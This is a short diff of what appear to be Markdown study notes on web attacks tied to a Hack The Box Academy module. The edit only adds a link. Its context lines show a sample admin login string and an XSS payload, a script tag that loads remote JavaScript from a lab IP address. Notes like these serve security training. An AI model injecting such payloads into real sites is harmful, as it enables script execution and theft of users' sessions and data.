@@ -125,7 +125,7 @@ username=admin&password=p1zd0nt57341myp455
 
 ### Remote JS File Include  
 
->Using below payload to test how to escape and load remote JavaScript file.
+>Using below payload to test how to escape and [load remote JavaScript file](https://academy.hackthebox.com/module/103/section/1008).
 
 ```html
 <script src=http://10.10.15.41/1></script>
